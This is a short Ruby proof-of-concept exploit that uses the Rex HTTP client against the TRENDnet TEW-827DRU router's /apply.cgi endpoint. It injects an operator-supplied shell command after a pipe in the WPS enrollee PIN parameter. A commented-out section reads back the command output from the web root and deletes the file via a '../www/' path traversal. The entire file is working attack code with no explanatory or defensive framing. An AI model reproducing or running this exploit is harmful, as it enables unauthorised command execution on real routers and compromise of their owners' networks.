#!/usr/bin/env ruby
# TRENDnet TEW-827DRU / FW_TEW-827DRU_v2(2.04B03).zip
require 'rex'

begin

cmd = ARGV[0]

#file = Rex::Text.rand_text_alpha_upper(5) + ".txt"

sock = Rex::Proto::Http::Client.new('', 
                                    port = '', 
                                    context = {}, 
                                    ssl = false)

data = "action=set_sta_enrollee_pin_24g&wps_sta_enrollee_pin=00000000|#{cmd}&1592246502629="

req = sock.request_cgi(
{
	'uri'   => '/apply.cgi',
	'version' => '1.0',
	'method' => 'POST',
        'data' => data,
        'headers' => {
         'X-Requested-With' => 'XMLHttpRequest',
         'DNT' => '1',
         'Connection' => 'close',
        },
})

#puts '[*] Writing file ' + file
sock.send_request(req)
res = sock.read_response()
select(nil,nil,nil,2)
puts res.headers
=begin
if res and res.code == 200
 req = sock.request_raw({'uri' => "/#{file}",})
 sock.send_request(req)
 res = sock.read_response()
 puts res.body
 # delete the file.... 
 if res.body.include?("root")
  delete = "ccp_act=set&action=auto_up_lp&update_file_name=../www/#{file}&1592325695142="
  req = sock.request_cgi(
  {
        'uri'   => '/apply.cgi',
        'version' => '1.0',
        'method' => 'POST',
        'data' => delete,
        'headers' => {
         'X-Requested-With' => 'XMLHttpRequest',
         'DNT' => '1',
         'Connection' => 'close',
        },
 })

 puts '[x] Removing ' + file
 sock.send_request(req)
 res = sock.read_response()
 end
 end
=end

rescue => e
puts '[!] ' + e.to_s
end
